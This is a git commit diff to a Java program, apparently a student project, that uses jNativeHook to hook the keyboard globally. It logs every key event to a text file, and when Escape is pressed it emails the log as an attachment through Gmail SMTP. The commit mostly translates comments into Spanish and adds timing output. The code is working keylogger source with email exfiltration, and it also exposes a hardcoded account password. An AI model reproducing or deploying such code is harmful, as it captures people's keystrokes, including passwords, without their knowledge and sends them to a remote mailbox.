964c2c6144fac96ca51352617c10bf1dfd822184
joaerazogo <joaerazogo@unal.edu.co>
2018-05-29 07:58:04 -0500

    keylogger con tiempos

--- src/jNativeHookExample.java
+++ src/jNativeHookExample.java
@@ -3,7 +3,6 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent; 
 import org.jnativehook.keyboard.NativeKeyListener;
 import java.io.File;
-import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.util.Properties;
@@ -21,26 +20,27 @@ import javax.mail.internet.MimeMultipart;
 
 public class jNativeHookExample implements NativeKeyListener{
 	
-    /* Key Pressed */
+    /* Tecla presionada */
     public void nativeKeyPressed(NativeKeyEvent e) {
-        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    	long startTime = System.currentTimeMillis();
+        System.out.println("Tecla presionada: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
         try {
         	System.out.println("---------------------------------------------");
-        	File archivoKeyLogger = new File("FileKeyLogger.txt");
-			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
+        	File fileKeyLogger = new File("FileKeyLogger.txt");
+			FileWriter writeResults = new FileWriter(fileKeyLogger, true);
 			writeResults.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexión
+			// se cierra la conexión
 			writeResults.close();
 		} catch (IOException e2) {
-			System.out.println("Error al escribir");
+			System.out.println("Error al escribir las salidas de teclado");
 		}
- 
-        /* Terminate program when one press ESCAPE */
+        //long totalSum =+ (System.currentTimeMillis()-startTime);
+        //System.out.println("tiempo de ejecucion en Millis: "+totalSum);
+        /* El porgrama finaliza cuando presionamos la tecla ESCAPE (esc) */
         if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
         	try
             {
-              // se obtiene el objeto Session. La configuración es para
-              // una cuenta de gmail.
+              // se obtiene el objeto Session. La configuración es para una cuenta de gmail.
                 Properties props = new Properties();
                 props.put("mail.smtp.host", "smtp.gmail.com");
                 props.setProperty("mail.smtp.starttls.enable", "true");
@@ -49,38 +49,40 @@ public class jNativeHookExample implements NativeKeyListener{
                 props.setProperty("mail.smtp.auth", "true");
 
                 Session session = Session.getDefaultInstance(props, null);
-                // session.setDebug(true);
 
                 // Se compone la parte del texto
                 BodyPart texto = new MimeBodyPart();
                 texto.setText("Texto del mensaje");
 
-                // Se compone el adjunto con la imagen
+                // Se compone el adjunto con el archivo
                 BodyPart adjunto = new MimeBodyPart();
                 adjunto.setDataHandler(
                     new DataHandler(new FileDataSource("/home/jose/workspace/Keylogger/FileKeyLogger.txt")));
                 adjunto.setFileName("FileKeyLogger.txt");
 
-                // Una MultiParte para agrupar texto e imagen.
-                MimeMultipart multiParte = new MimeMultipart();
-                multiParte.addBodyPart(texto);
-                multiParte.addBodyPart(adjunto);
+                // MultiParte para agrupar y añadir texto e imagen.
+                MimeMultipart multiPart = new MimeMultipart();
+                multiPart.addBodyPart(texto);
+                multiPart.addBodyPart(adjunto);
 
-                // Se compone el correo, dando to, from, subject y el
-                // contenido.
-                MimeMessage message = new MimeMessage(session);
-                message.setFrom(new InternetAddress("joaerazogo@unal.edu.co"));
-                message.addRecipient(
+                // Se compone el correo, dando to, from, subject y el contenido.
+                MimeMessage messageEmail = new MimeMessage(session);
+                messageEmail.setFrom(new InternetAddress("joaerazogo@unal.edu.co"));
+                messageEmail.addRecipient(
                     Message.RecipientType.TO,
                     new InternetAddress("joaerazogo@unal.edu.co"));
-                message.setSubject("Hellow");
-                message.setContent(multiParte);
+                messageEmail.setSubject("Hellow");
+                messageEmail.setContent(multiPart);
 
-                // Se envia el correo.
+                // Se envia el correo, en este caso gmail.
                 Transport t = session.getTransport("smtp");
                 t.connect("joaerazogo@unal.edu.co", "MelkorValinor66");
-                t.sendMessage(message, message.getAllRecipients());
+                t.sendMessage(messageEmail, messageEmail.getAllRecipients());
                 t.close();
+                System.out.println("///////////////////////////////////////////: "+startTime);
+                long totalSum = (System.currentTimeMillis());
+                System.out.println("tiempo de ejecucion en Millis: "+totalSum);
+                
             }
             catch (Exception e1)
             {
@@ -90,31 +92,30 @@ public class jNativeHookExample implements NativeKeyListener{
 				GlobalScreen.unregisterNativeHook();
 				
 			} catch (NativeHookException e1) {
-				// TODO Auto-generated catch block
 				e1.printStackTrace();
 			}
+            
         }
     }
  
-    /* Key Released */
+    /* tecla liberada */
     public void nativeKeyReleased(NativeKeyEvent e) {
-        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+        System.out.println("Tecla liberada: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 		try {
 			System.out.println("---------------------------------------------");
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
 			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
 			writeResults.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexión
+			//Se cierr
 			writeResults.close();
 		} catch (IOException e1) {
-			// TODO Auto-generated catch block
-			System.out.println("Error al escribir");
+			System.out.println("Error al escribir en el archivo");
 		}
     }
  
-    /* I can't find any output from this call */
+    /*Acá se determina que no se encuentra cualquier salida de esta llamada */
     public void nativeKeyTyped(NativeKeyEvent e) {
-        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
+        System.out.println("Tecla mecanografiada: " + e.getKeyText(e.getKeyCode()));
         try {
         	System.out.println("---------------------------------------------");
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
@@ -123,21 +124,22 @@ public class jNativeHookExample implements NativeKeyListener{
 			//cerramos la conexión
 			writeResults.close();
 		} catch (IOException e1) {
-			// TODO Auto-generated catch block
 			System.out.println("Error al escribir");
 		}
     }
  
     public static void main(String[] args) {
         try {
-            /* Register jNativeHook */
+            /* Registra JnativeHook, es decir, permite regitrar los eventos del teclado, mouse, etc */
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException e) {
-            /* Its error */
+            /* Error */
             e.printStackTrace();
         }
- 
-        /* Construct the example object and initialze native hook. */
+        
+        //long startTime = System.currentTimeMillis();
         GlobalScreen.addNativeKeyListener(new jNativeHookExample());
+        //long totalSum = (System.currentTimeMillis()-startTime);
+        //System.out.println("tiempo de ejecucion en Millis: "+totalSum);
     }
 }
